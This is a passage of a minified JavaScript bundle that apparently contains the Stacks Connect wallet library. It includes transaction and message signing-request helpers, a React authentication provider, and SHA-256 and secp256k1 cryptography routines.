            throw new Error("Uint8Array expected");
          let t = "";
          for (let n of e) t += Ye[n];
          return t;
        }
        var Je,
          Xe,
          Qe =
            (((Xe = Qe || {}).ContractCall = "contract_call"),
            (Xe.ContractDeploy = "smart_contract"),
            (Xe.STXTransfer = "token_transfer"),
            Xe),
          et =
            (((Je = et || {}).BUFFER = "buffer"),
            (Je.UINT = "uint"),
            (Je.INT = "int"),
            (Je.PRINCIPAL = "principal"),
            (Je.BOOL = "bool"),
            Je),
          tt = (e) => {
            let t = e;
            if (!t) {
              let e = new o.X(["store_write"], document.location.href);
              t = new s.V({ appConfig: e });
            }
            return t;
          };
        function nt(e) {
          try {
            return tt(e).loadUserData().appPrivateKey;
          } catch (t) {
            return !1;
          }
        }
        var rt = (e) => {
          let t = tt(e).loadUserData().appPrivateKey;
          return {
            privateKey: t,
            publicKey: a.SECP256K1Client.derivePublicKey(t),
          };
        };
        function it(e) {
          var t;
          let { stxAddress: n, userSession: r, network: i } = e;
          if (n) return n;
          if (!r || !i) return;
          let o =
              null == (t = null == r ? void 0 : r.loadUserData().profile)
                ? void 0
                : t.stxAddress,
            s = { [c.oK.Mainnet]: "mainnet", [c.oK.Testnet]: "testnet" };
          return null == o ? void 0 : o[s[i.chainId]];
        }
        function ot(e) {
          return e.map((e) => Ze(ge(e)));
        }
        async function st(e, t) {
          let { postConditions: n } = e;
          return (
            n && "string" != typeof n[0] && (n = ot(n)),
            new a.TokenSigner("ES256k", t).signAsync(
              ze(je({}, e), { postConditions: n })
            )
          );
        }
        function at(e) {
          let { postConditions: t } = e;
          return (
            t && "string" != typeof t[0] && (t = ot(t)),
            (0, a.createUnsecuredToken)(ze(je({}, e), { postConditions: t }))
          );
        }
        var lt = async (e) => {
            let { token: t, options: n } = e;
            var r, i, o;
            let s = We();
            if (!s) throw new Error("Hiro Wallet not installed");
            try {
              let e = await s.transactionRequest(t),
                { txRaw: o } = e,
                a = (function (e) {
                  if ("string" != typeof e)
                    throw new TypeError(
                      "hexToBytes: expected string, got " + typeof e
                    );
                  let t = e.length % 2 ? `0${e}` : e,
                    n = new Uint8Array(t.length / 2);
                  for (let r = 0; r < n.length; r++) {
                    let e = 2 * r,
                      i = t.slice(e, e + 2),
                      o = Number.parseInt(i, 16);
                    if (Number.isNaN(o) || o < 0)
                      throw new Error("Invalid byte sequence");
                    n[r] = o;
                  }
                  return n;
                })(o.replace(/^0x/, "")),
                l = _e(a);
              if ("sponsored" in n && n.sponsored)
                return void (
                  null == (r = n.onFinish) ||
                  r.call(n, ze(je({}, e), { stacksTransaction: l }))
                );
              null == (i = n.onFinish) ||
                i.call(n, ze(je({}, e), { stacksTransaction: l }));
            } catch (Nt) {
              console.error("[Connect] Error during transaction request", Nt),
                null == (o = n.onCancel) || o.call(n);
            }
          },
          ct = async (e) => {
            let t = e,
              { functionArgs: n, appDetails: r, userSession: i } = t,
              o = Ke(t, ["functionArgs", "appDetails", "userSession"]),
              s = n.map((e) => ("string" == typeof e ? e : Ze(A(e))));
            if (nt(i)) {
              let { privateKey: e, publicKey: t } = rt(i),
                n = ze(je({}, o), {
                  functionArgs: s,
                  txType: "contract_call",
                  publicKey: t,
                });
              return r && (n.appDetails = r), st(n, e);
            }
            let a = ze(je({}, o), { functionArgs: s, txType: "contract_call" });
            return r && (a.appDetails = r), at(a);
          },
          ut = async (e) => {
            let t = e,
              { appDetails: n, userSession: r } = t,
              i = Ke(t, ["appDetails", "userSession"]);
            if (nt(r)) {
              let { privateKey: e, publicKey: t } = rt(r),
                o = ze(je({}, i), { publicKey: t, txType: "smart_contract" });
              return n && (o.appDetails = n), st(o, e);
            }
            let o = ze(je({}, i), { txType: "smart_contract" });
            return n && (o.appDetails = n), at(o);
          },
          ft = async (e) => {
            let t = e,
              { amount: n, appDetails: r, userSession: i } = t,
              o = Ke(t, ["amount", "appDetails", "userSession"]);
            if (nt(i)) {
              let { privateKey: e, publicKey: t } = rt(i),
                s = ze(je({}, o), {
                  amount: n.toString(10),
                  publicKey: t,
                  txType: "token_transfer",
                });
              return r && (s.appDetails = r), st(s, e);
            }
            let s = ze(je({}, o), {
              amount: n.toString(10),
              txType: "token_transfer",
            });
            return r && (s.appDetails = r), at(s);
          };
        async function ht(e, t) {
          let n = await t(
            je(
              je(
                {},
                (function (e) {
                  let t = e.network || new l.an(),
                    n = tt(e.userSession),
                    r = ze(je({}, e), { network: t, userSession: n });
                  return je({ stxAddress: it(r) }, r);
                })(e)
              ),
              e
            )
          );
          return lt({ token: n, options: e });
        }
        var dt = async (e) => {
          let t = e,
            { allowedSighash: n, hex: r, signAtIndex: i, userSession: o } = t,
            s = Ke(t, ["allowedSighash", "hex", "signAtIndex", "userSession"]);
          if (nt(o)) {
            let { privateKey: e, publicKey: t } = rt(o);
            return (async function (e, t) {
              return new a.TokenSigner("ES256k", t).signAsync(je({}, e));
            })(
              ze(je({}, s), {
                allowedSighash: n,
                hex: r,
                signAtIndex: i,
                publicKey: t,
              }),
              e
            );
          }
          let l = je({}, s);
          return (0, a.createUnsecuredToken)(l);
        };
        async function pt(e, t) {
          let n = await t(
            je(
              je(
                {},
                (function (e) {
                  let t = e.network || new l.an(),
                    n = tt(e.userSession),
                    r = ze(je({}, e), { network: t, userSession: n });
                  return je({}, r);
                })(e)
              ),
              e
            )
          );
          return (async function (e) {
            let { token: t, options: n } = e;
            var r, i;
            let o = We();
            if (!o) throw new Error("Hiro Wallet not installed");
            try {
              let e = await o.psbtRequest(t);
              null == (r = n.onFinish) || r.call(n, e);
            } catch (Je) {
              console.error("[Connect] Error during psbt request", Je),
                null == (i = n.onCancel) || i.call(n);
            }
          })({ token: n, options: e });
        }
        function gt(e) {
          var t;
          let { userSession: n, network: r } = e;
          if (!n || !r) return;
          let i =
              null == (t = null == n ? void 0 : n.loadUserData().profile)
                ? void 0
                : t.stxAddress,
            o = { [c.oK.Mainnet]: "mainnet", [c.oK.Testnet]: "testnet" };
          return null == i ? void 0 : i[o[r.chainId]];
        }
        function yt(e) {
          let t = e.network || new l.an(),
            n = tt(e.userSession),
            r = ze(je({}, e), { network: t, userSession: n });
          return je({ stxAddress: gt(r) }, r);
        }
        var wt = async (e) => {
          let t = e,
            { userSession: n } = t,
            r = Ke(t, ["userSession"]);
          if (nt(n)) {
            let { privateKey: e, publicKey: t } = rt(n);
            return (async function (e, t) {
              return new a.TokenSigner("ES256k", t).signAsync(je({}, e));
            })(ze(je({}, r), { publicKey: t }), e);
          }
          let i = je({}, r);
          return (0, a.createUnsecuredToken)(i);
        };
        async function mt(e, t) {
          return (async function (e) {
            let { token: t, options: n } = e;
            var r, i;
            let o = We();
            if (!o) throw new Error("Hiro Wallet not installed.");
            try {
              let e = await o.signatureRequest(t);
              null == (r = n.onFinish) || r.call(n, e);
            } catch (Je) {
              console.error("[Connect] Error during signature request", Je),
                null == (i = n.onCancel) || i.call(n);
            }
          })({ token: await t(je(je({}, yt(e)), e)), options: e });
        }
        async function bt(e, t) {
          return (async function (e) {
            let { token: t, options: n } = e;
            var r, i;
            let o = We();
            if (!o) throw new Error("Hiro Wallet not installed.");
            try {
              let e = await o.structuredDataSignatureRequest(t);
              null == (r = n.onFinish) || r.call(n, e);
            } catch (Je) {
              console.error("[Connect] Error during signature request", Je),
                null == (i = n.onCancel) || i.call(n);
            }
          })({ token: await t(je(je({}, yt(e)), e)), options: e });
        }
        function vt(e) {
          return ze(je({}, e), {
            message: Ze(A(e.message)),
            domain: Ze(A(e.domain)),
          });
        }
        async function Et(e) {
          let t = e,
            { userSession: n } = t,
            r = Ke(t, ["userSession"]);
          if (nt(n)) {
            let { privateKey: e, publicKey: t } = rt(n);
            return (async function (e, t) {
              return new a.TokenSigner("ES256k", t).signAsync(vt(e));
            })(ze(je({}, r), { publicKey: t }), e);
          }
          return (0, a.createUnsecuredToken)(vt(e));
        }
        var St = async (e) => {
          let t = e,
            { userSession: n, profile: r } = t,
            i = Ke(t, ["userSession", "profile"]);
          if (nt(n)) {
            let { privateKey: e, publicKey: t } = rt(n);
            return (async function (e, t) {
              return new a.TokenSigner("ES256k", t).signAsync(je({}, e));
            })(ze(je({}, i), { profile: r, publicKey: t }), e);
          }
          let o = je({}, i);
          return (0, a.createUnsecuredToken)(o);
        };
        async function xt(e, t) {
          let n = await t(
            je(
              je(
                {},
                (function (e) {
                  let t = e.network || new l.an(),
                    n = tt(e.userSession),
                    r = ze(je({}, e), { network: t, userSession: n });
                  return je({}, r);
                })(e)
              ),
              e
            )
          );
          return (async function (e) {
            let { token: t, options: n } = e;
            var r, i;
            let o = We();
            if (!o) throw new Error("Hiro Wallet not installed.");
            try {
              let e = await o.profileUpdateRequest(t);
              null == (r = n.onFinish) || r.call(n, e);
            } catch (Je) {
              console.error("[Connect] Error during signature request", Je),
                null == (i = n.onCancel) || i.call(n);
            }
          })({ token: n, options: e });
        }
        var At = ((e) => (
            (e[(e.DEFAULT = 0)] = "DEFAULT"),
            (e[(e.ALL = 1)] = "ALL"),
            (e[(e.NONE = 2)] = "NONE"),
            (e[(e.SINGLE = 3)] = "SINGLE"),
            (e[(e.ANYONECANPAY = 128)] = "ANYONECANPAY"),
            e
          ))(At || {}),
          kt = (e) =>
            ((e) => {
              if (We()) Ge(e);
              else if (void 0 !== typeof window) {
                Ne(window);
                let t = document.createElement("connect-modal");
                (t.authOptions = e), document.body.appendChild(t);
                let n = (e) => {
                  "Escape" === e.key &&
                    (document.removeEventListener("keydown", n), t.remove());
                };
                document.addEventListener("keydown", n);
              }
            })(e),
          Tt = Object.defineProperty,
          Ct = Object.defineProperties,
          It = Object.getOwnPropertyDescriptors,
          Ot = Object.getOwnPropertySymbols,
          Bt = Object.prototype.hasOwnProperty,
          Pt = Object.prototype.propertyIsEnumerable,
          _t = (e, t, n) =>
            t in e
              ? Tt(e, t, {
                  enumerable: !0,
                  configurable: !0,
                  writable: !0,
                  value: n,
                })
              : (e[t] = n),
          Ut = (e, t) => {
            for (var n in t || (t = {})) Bt.call(t, n) && _t(e, n, t[n]);
            if (Ot) for (var n of Ot(t)) Pt.call(t, n) && _t(e, n, t[n]);
            return e;
          },
          Nt = (e, t) => Ct(e, It(t)),
          Rt = {
            isOpen: !1,
            isAuthenticating: !1,
            authData: void 0,
            userSession: void 0,
            authOptions: {
              redirectTo: "",
              manifestPath: "",
              onFinish: () => null,
              authOrigin: void 0,
              sendToSignIn: !1,
              appDetails: { name: "", icon: "" },
            },
          },
          Lt = (e, t) => {
            let { type: n, payload: r } = t;
            if ("data/update-auth-options" === n)
              return Nt(Ut({}, e), {
                authOptions: Ut(Ut({}, e.authOptions), r),
              });
            throw new Error(`Unhandled action type: ${n}`);
          },
          $t = (0, i.createContext)(Rt),
          Ht = (0, i.createContext)(void 0),
          Dt = (e) => {
            let { authOptions: t, children: n } = e,
              [r, o] = (0, i.useReducer)(Lt, Rt);
            return i.createElement(
              $t.Provider,
              { value: Nt(Ut({}, r), { authOptions: t }) },
              i.createElement(Ht.Provider, { value: o }, n)
            );
          },
          Mt = (e) => {
            let { authOptions: t, children: n } = e;
            return i.createElement(Dt, { authOptions: t }, n);
          },
          Ft = () => {
            let {
                isOpen: e,
                isAuthenticating: t,
                authData: n,
                authOptions: r,
                userSession: o,
              } = (0, i.useContext)($t),
              s = (() => {
                let e = (0, i.useContext)(Ht);
                if (!e)
                  throw new Error(
                    "This must be used within the ConnectProvider component."
                  );
                return e;
              })();
            return {
              isOpen: e,
              isAuthenticating: t,
              authData: n,
              authOptions: r,
              userSession: o,
              doOpenAuth: (e, t) => {
                if (e) {
                  let e = Nt(Ut(Ut({}, r), t), {
                    onFinish: (e) => {
                      var t;
                      null == (t = r.onFinish) || t.call(r, e);
                    },
                    sendToSignIn: !0,
                  });
                  Ge(e);
                } else
                  kt(Nt(Ut({}, r), { sendToSignIn: !1 })),
                    r &&
                      ((e) => {
                        s({ type: "data/update-auth-options", payload: e });
                      })(r);
              },
              doAuth: function () {
                let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {};
                Ge(
                  Nt(Ut(Ut({}, r), e), {
                    onFinish: (e) => {
                      var t;
                      null == (t = r.onFinish) || t.call(r, e);
                    },
                  })
                );
              },
              authenticate: Ge,
              doContractCall: function (e) {
                return (function (e) {
                  return ht(e, ct);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
              doContractDeploy: function (e) {
                return (function (e) {
                  return ht(e, ut);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
              doSTXTransfer: function (e) {
                return (function (e) {
                  return ht(e, ft);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
              doProfileUpdate: function (e) {
                return (function (e) {
                  return xt(e, St);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
              sign: function (e) {
                return (function (e) {
                  return mt(e, wt);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
              signStructuredData: function (e) {
                return (function (e) {
                  return bt(e, Et);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
              signPsbt: function (e) {
                return (function (e) {
                  return pt(e, dt);
                })(
                  Nt(Ut({}, e), {
                    authOrigin: r.authOrigin,
                    appDetails: r.appDetails,
                  })
                );
              },
            };
          };
      },
      6379: (e, t, n) => {
        "use strict";
        function r(e) {
          if (!Number.isSafeInteger(e) || e < 0)
            throw new Error(`Wrong positive integer: ${e}`);
        }
        function i(e) {
          if (!(e instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          if (n.length > 0 && !n.includes(e.length))
            throw new TypeError(
              `Expected Uint8Array of length ${n}, not of length=${e.length}`
            );
        }
        n.d(t, { ZP: () => s });
        const o = {
            number: r,
            bool: function (e) {
              if ("boolean" !== typeof e)
                throw new Error(`Expected boolean, not ${e}`);
            },
            bytes: i,
            hash: function (e) {
              if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error(
                  "Hash should be wrapped by utils.wrapConstructor"
                );
              r(e.outputLen), r(e.blockLen);
            },
            exists: function (e) {
              let t =
                !(arguments.length > 1 && void 0 !== arguments[1]) ||
                arguments[1];
              if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
              if (t && e.finished)
                throw new Error("Hash#digest() has already been called");
            },
            output: function (e, t) {
              i(e);
              const n = t.outputLen;
              if (e.length < n)
                throw new Error(
                  `digestInto() expects output buffer of length at least ${n}`
                );
            },
          },
          s = o;
      },
      8206: (e, t, n) => {
        "use strict";
        n.d(t, { N: () => o });
        var r = n(6379),
          i = n(3925);
        class o extends i.kb {
          constructor(e, t, n, r) {
            super(),
              (this.blockLen = e),
              (this.outputLen = t),
              (this.padOffset = n),
              (this.isLE = r),
              (this.finished = !1),
              (this.length = 0),
              (this.pos = 0),
              (this.destroyed = !1),
              (this.buffer = new Uint8Array(e)),
              (this.view = (0, i.GL)(this.buffer));
          }
          update(e) {
            r.ZP.exists(this);
            const { view: t, buffer: n, blockLen: o } = this,
              s = (e = (0, i.O0)(e)).length;
            for (let r = 0; r < s; ) {
              const a = Math.min(o - this.pos, s - r);
              if (a !== o)
                n.set(e.subarray(r, r + a), this.pos),
                  (this.pos += a),
                  (r += a),
                  this.pos === o && (this.process(t, 0), (this.pos = 0));
              else {
                const t = (0, i.GL)(e);
                for (; o <= s - r; r += o) this.process(t, r);
              }
            }
            return (this.length += e.length), this.roundClean(), this;
          }
          digestInto(e) {
            r.ZP.exists(this), r.ZP.output(e, this), (this.finished = !0);
            const { buffer: t, view: n, blockLen: o, isLE: s } = this;
            let { pos: a } = this;
            (t[a++] = 128),
              this.buffer.subarray(a).fill(0),
              this.padOffset > o - a && (this.process(n, 0), (a = 0));
            for (let r = a; r < o; r++) t[r] = 0;
            !(function (e, t, n, r) {
              if ("function" === typeof e.setBigUint64)
                return e.setBigUint64(t, n, r);
              const i = BigInt(32),
                o = BigInt(4294967295),
                s = Number((n >> i) & o),
                a = Number(n & o),
                l = r ? 4 : 0,
                c = r ? 0 : 4;
              e.setUint32(t + l, s, r), e.setUint32(t + c, a, r);
            })(n, o - 8, BigInt(8 * this.length), s),
              this.process(n, 0);
            const l = (0, i.GL)(e),
              c = this.outputLen;
            if (c % 4)
              throw new Error("_sha2: outputLen should be aligned to 32bit");
            const u = c / 4,
              f = this.get();
            if (u > f.length)
              throw new Error("_sha2: outputLen bigger than state");
            for (let r = 0; r < u; r++) l.setUint32(4 * r, f[r], s);
          }
          digest() {
            const { buffer: e, outputLen: t } = this;
            this.digestInto(e);
            const n = e.slice(0, t);
            return this.destroy(), n;
          }
          _cloneInto(e) {
            e || (e = new this.constructor()), e.set(...this.get());
            const {
              blockLen: t,
              buffer: n,
              length: r,
              finished: i,
              destroyed: o,
              pos: s,
            } = this;
            return (
              (e.length = r),
              (e.pos = s),
              (e.finished = i),
              (e.destroyed = o),
              r % t && e.buffer.set(n),
              e
            );
          }
        }
      },
      3552: (e, t, n) => {
        "use strict";
        n.d(t, { J: () => f });
        var r = n(8206),
          i = n(3925);
        const o = (e, t, n) => (e & t) ^ (e & n) ^ (t & n),
          s = new Uint32Array([
            1116352408, 1899447441, 3049323471, 3921009573, 961987163,
            1508970993, 2453635748, 2870763221, 3624381080, 310598401,
            607225278, 1426881987, 1925078388, 2162078206, 2614888103,
            3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983,
            1249150122, 1555081692, 1996064986, 2554220882, 2821834349,
            2952996808, 3210313671, 3336571891, 3584528711, 113926993,
            338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700,
            1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
            3259730800, 3345764771, 3516065817, 3600352804, 4094571909,
            275423344, 430227734, 506948616, 659060556, 883997877, 958139571,
            1322822218, 1537002063, 1747873779, 1955562222, 2024104815,
            2227730452, 2361852424, 2428436474, 2756734187, 3204031479,
            3329325298,
          ]),
          a = new Uint32Array([
            1779033703, 3144134277, 1013904242, 2773480762, 1359893119,
            2600822924, 528734635, 1541459225,
          ]),
          l = new Uint32Array(64);
        class c extends r.N {
          constructor() {
            super(64, 32, 8, !1),
              (this.A = 0 | a[0]),
              (this.B = 0 | a[1]),
              (this.C = 0 | a[2]),
              (this.D = 0 | a[3]),
              (this.E = 0 | a[4]),
              (this.F = 0 | a[5]),
              (this.G = 0 | a[6]),
              (this.H = 0 | a[7]);
          }
          get() {
            const { A: e, B: t, C: n, D: r, E: i, F: o, G: s, H: a } = this;
            return [e, t, n, r, i, o, s, a];
          }
          set(e, t, n, r, i, o, s, a) {
            (this.A = 0 | e),
              (this.B = 0 | t),
              (this.C = 0 | n),
              (this.D = 0 | r),
              (this.E = 0 | i),
              (this.F = 0 | o),
              (this.G = 0 | s),
              (this.H = 0 | a);
          }
          process(e, t) {
            for (let i = 0; i < 16; i++, t += 4) l[i] = e.getUint32(t, !1);
            for (let o = 16; o < 64; o++) {
              const e = l[o - 15],
                t = l[o - 2],
                n = (0, i.np)(e, 7) ^ (0, i.np)(e, 18) ^ (e >>> 3),
                r = (0, i.np)(t, 17) ^ (0, i.np)(t, 19) ^ (t >>> 10);
              l[o] = (r + l[o - 7] + n + l[o - 16]) | 0;
            }
            let { A: n, B: r, C: a, D: c, E: u, F: f, G: h, H: d } = this;
            for (let g = 0; g < 64; g++) {
              const e =
                  (d +
                    ((0, i.np)(u, 6) ^ (0, i.np)(u, 11) ^ (0, i.np)(u, 25)) +
                    (((p = u) & f) ^ (~p & h)) +
                    s[g] +
                    l[g]) |
                  0,
                t =
                  (((0, i.np)(n, 2) ^ (0, i.np)(n, 13) ^ (0, i.np)(n, 22)) +
                    o(n, r, a)) |
                  0;
              (d = h),
                (h = f),
                (f = u),
                (u = (c + e) | 0),
                (c = a),
                (a = r),
                (r = n),
                (n = (e + t) | 0);
            }
            var p;
            (n = (n + this.A) | 0),
              (r = (r + this.B) | 0),
              (a = (a + this.C) | 0),
              (c = (c + this.D) | 0),
              (u = (u + this.E) | 0),
              (f = (f + this.F) | 0),
              (h = (h + this.G) | 0),
              (d = (d + this.H) | 0),
              this.set(n, r, a, c, u, f, h, d);
          }
          roundClean() {
            l.fill(0);
          }
          destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
          }
        }
        class u extends c {
          constructor() {
            super(),
              (this.A = -1056596264),
              (this.B = 914150663),
              (this.C = 812702999),
              (this.D = -150054599),
              (this.E = -4191439),
              (this.F = 1750603025),
              (this.G = 1694076839),
              (this.H = -1090891868),
              (this.outputLen = 28);
          }
        }
        const f = (0, i.hE)(() => new c());
        (0, i.hE)(() => new u());
      },
      3925: (e, t, n) => {
        "use strict";
        n.d(t, {
          kb: () => s,
          GL: () => r,
          np: () => i,
          O0: () => o,
          hE: () => a,
        });
        "object" === typeof self && "crypto" in self && self.crypto;
        const r = (e) => new DataView(e.buffer, e.byteOffset, e.byteLength),
          i = (e, t) => (e << (32 - t)) | (e >>> t);
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]))
          throw new Error("Non little-endian hardware is not supported");
        Array.from({ length: 256 }, (e, t) => t.toString(16).padStart(2, "0"));
        function o(e) {
          if (
            ("string" === typeof e &&
              (e = (function (e) {
                if ("string" !== typeof e)
                  throw new TypeError(
                    "utf8ToBytes expected string, got " + typeof e
                  );
                return new TextEncoder().encode(e);
              })(e)),
            !(e instanceof Uint8Array))
          )
            throw new TypeError(
              `Expected input type is Uint8Array (got ${typeof e})`
            );
          return e;
        }
        class s {
          clone() {
            return this._cloneInto();
          }
        }
        function a(e) {
          const t = (t) => e().update(o(t)).digest(),
            n = e();
          return (
            (t.outputLen = n.outputLen),
            (t.blockLen = n.blockLen),
            (t.create = () => e()),
            t
          );
        }
      },
      9090: (e, t, n) => {
        "use strict";
        var r;
        n.d(t, {
          $3: () => Q,
          E9: () => k,
          P6: () => le,
          Pc: () => I,
          kS: () => oe,
        });
        var i = n(8173);
        const o = BigInt(0),
          s = BigInt(1),
          a = BigInt(2),
          l = BigInt(3),
          c = BigInt(8),
          u = Object.freeze({
            a: o,
            b: BigInt(7),
            P: BigInt(
              "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"
            ),
            n: BigInt(
              "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"
            ),
            h: s,
            Gx: BigInt(
              "55066263022277343669578718895168534326250603453777594175500187360389116729240"
            ),
            Gy: BigInt(
              "32670510020758816978083085130507043184471273380659243275938904335757337482424"
            ),
            beta: BigInt(
              "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
            ),
          }),
          f = (e, t) => (e + t / a) / t,
          h = {
            beta: BigInt(
              "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
            ),
            splitScalar(e) {
              const { n: t } = u,
                n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
                r = -s * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
                i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
                o = n,
                a = BigInt("0x100000000000000000000000000000000"),
                l = f(o * e, t),
                c = f(-r * e, t);
              let h = F(e - l * n - c * i, t),
                d = F(-l * r - c * o, t);
              const p = h > a,
                g = d > a;
              if ((p && (h = t - h), g && (d = t - d), h > a || d > a))
                throw new Error("splitScalarEndo: Endomorphism failed, k=" + e);
              return { k1neg: p, k1: h, k2neg: g, k2: d };
            },
          },
          d = 32,
          p = 32,
          g = 32,
          y = d + 1,
          w = 2 * d + 1;
        function m(e) {
          const { a: t, b: n } = u,
            r = F(e * e),
            i = F(r * e);
          return F(i + t * e + n);
        }
        const b = u.a === o;
        class v extends Error {
          constructor(e) {
            super(e);
          }
        }
        function E(e) {
          if (!(e instanceof S)) throw new TypeError("JacobianPoint expected");
        }
        class S {
          constructor(e, t, n) {
            (this.x = e), (this.y = t), (this.z = n);
          }
          static fromAffine(e) {
            if (!(e instanceof k))
              throw new TypeError("JacobianPoint#fromAffine: expected Point");
            return e.equals(k.ZERO) ? S.ZERO : new S(e.x, e.y, s);
          }
          static toAffineBatch(e) {
            const t = (function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : u.P;
              const n = new Array(e.length),
                r = z(
                  e.reduce(
                    (e, r, i) => (r === o ? e : ((n[i] = e), F(e * r, t))),
                    s
                  ),
                  t
                );
              return (
                e.reduceRight(
                  (e, r, i) =>
                    r === o ? e : ((n[i] = F(e * n[i], t)), F(e * r, t)),
                  r
                ),
                n
              );
            })(e.map((e) => e.z));
            return e.map((e, n) => e.toAffine(t[n]));
          }
          static normalizeZ(e) {
            return S.toAffineBatch(e).map(S.fromAffine);
          }
          equals(e) {
            E(e);
            const { x: t, y: n, z: r } = this,
              { x: i, y: o, z: s } = e,
              a = F(r * r),
              l = F(s * s),
              c = F(t * l),
              u = F(i * a),
              f = F(F(n * s) * l),
              h = F(F(o * r) * a);
            return c === u && f === h;
          }
          negate() {
            return new S(this.x, F(-this.y), this.z);
          }
          double() {
            const { x: e, y: t, z: n } = this,
              r = F(e * e),
              i = F(t * t),
              o = F(i * i),
              s = e + i,
              u = F(a * (F(s * s) - r - o)),
              f = F(l * r),
              h = F(f * f),
              d = F(h - a * u),
              p = F(f * (u - d) - c * o),
              g = F(a * t * n);
            return new S(d, p, g);
          }
          add(e) {
            E(e);
            const { x: t, y: n, z: r } = this,
              { x: i, y: s, z: l } = e;
            if (i === o || s === o) return this;
            if (t === o || n === o) return e;
            const c = F(r * r),
              u = F(l * l),
              f = F(t * u),
              h = F(i * c),
              d = F(F(n * l) * u),
              p = F(F(s * r) * c),
              g = F(h - f),
              y = F(p - d);
            if (g === o) return y === o ? this.double() : S.ZERO;
            const w = F(g * g),
              m = F(g * w),
              b = F(f * w),
              v = F(y * y - m - a * b),
              x = F(y * (b - v) - d * m),
              A = F(r * l * g);
            return new S(v, x, A);
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiplyUnsafe(e) {
            const t = S.ZERO;
            if ("bigint" === typeof e && e === o) return t;
            let n = M(e);
            if (n === s) return this;
            if (!b) {
              let e = t,
                r = this;
              for (; n > o; )
                n & s && (e = e.add(r)), (r = r.double()), (n >>= s);
              return e;
            }
            let { k1neg: r, k1: i, k2neg: a, k2: l } = h.splitScalar(n),
              c = t,
              u = t,
              f = this;
            for (; i > o || l > o; )
              i & s && (c = c.add(f)),
                l & s && (u = u.add(f)),
                (f = f.double()),
                (i >>= s),
                (l >>= s);
            return (
              r && (c = c.negate()),
              a && (u = u.negate()),
              (u = new S(F(u.x * h.beta), u.y, u.z)),
              c.add(u)
            );
          }
          precomputeWindow(e) {
            const t = b ? 128 / e + 1 : 256 / e + 1,
              n = [];
            let r = this,
              i = r;
            for (let o = 0; o < t; o++) {
              (i = r), n.push(i);
              for (let t = 1; t < 2 ** (e - 1); t++) (i = i.add(r)), n.push(i);
              r = i.double();
            }
            return n;
          }
          wNAF(e, t) {
            !t && this.equals(S.BASE) && (t = k.BASE);
            const n = (t && t._WINDOW_SIZE) || 1;
            if (256 % n)
              throw new Error(
                "Point#wNAF: Invalid precomputation window, must be power of 2"
              );
            let r = t && A.get(t);
            r ||
              ((r = this.precomputeWindow(n)),
              t && 1 !== n && ((r = S.normalizeZ(r)), A.set(t, r)));
            let i = S.ZERO,
              o = S.BASE;
            const a = 1 + (b ? 128 / n : 256 / n),
              l = 2 ** (n - 1),
              c = BigInt(2 ** n - 1),
              u = 2 ** n,
              f = BigInt(n);
            for (let h = 0; h < a; h++) {
              const t = h * l;
              let n = Number(e & c);
              (e >>= f), n > l && ((n -= u), (e += s));
              const a = t,
                d = t + Math.abs(n) - 1,
                p = h % 2 !== 0,
                g = n < 0;
              0 === n ? (o = o.add(x(p, r[a]))) : (i = i.add(x(g, r[d])));
            }
            return { p: i, f: o };
          }
          multiply(e, t) {
            let n,
              r,
              i = M(e);
            if (b) {
              const { k1neg: e, k1: o, k2neg: s, k2: a } = h.splitScalar(i);
              let { p: l, f: c } = this.wNAF(o, t),
                { p: u, f: f } = this.wNAF(a, t);
              (l = x(e, l)),
                (u = x(s, u)),
                (u = new S(F(u.x * h.beta), u.y, u.z)),
                (n = l.add(u)),
                (r = c.add(f));
            } else {
              const { p: e, f: o } = this.wNAF(i, t);
              (n = e), (r = o);
            }
            return S.normalizeZ([n, r])[0];
          }
          toAffine(e) {
            const { x: t, y: n, z: r } = this,
              i = this.equals(S.ZERO);
            null == e && (e = i ? c : z(r));
            const o = e,
              a = F(o * o),
              l = F(a * o),
              u = F(t * a),
              f = F(n * l),
              h = F(r * o);
            if (i) return k.ZERO;
            if (h !== s) throw new Error("invZ was invalid");
            return new k(u, f);
          }
        }
        function x(e, t) {
          const n = t.negate();
          return e ? n : t;
        }
        (S.BASE = new S(u.Gx, u.Gy, s)), (S.ZERO = new S(o, s, o));
        const A = new WeakMap();
        class k {
          constructor(e, t) {
            (this.x = e), (this.y = t);
          }
          _setWindowSize(e) {
            (this._WINDOW_SIZE = e), A.delete(this);
          }
          hasEvenY() {
            return this.y % a === o;
          }
          static fromCompressedHex(e) {
            const t = 32 === e.length,
              n = H(t ? e : e.subarray(1));
            if (!Y(n)) throw new Error("Point is not on curve");
            let r = (function (e) {
              const { P: t } = u,
                n = BigInt(6),
                r = BigInt(11),
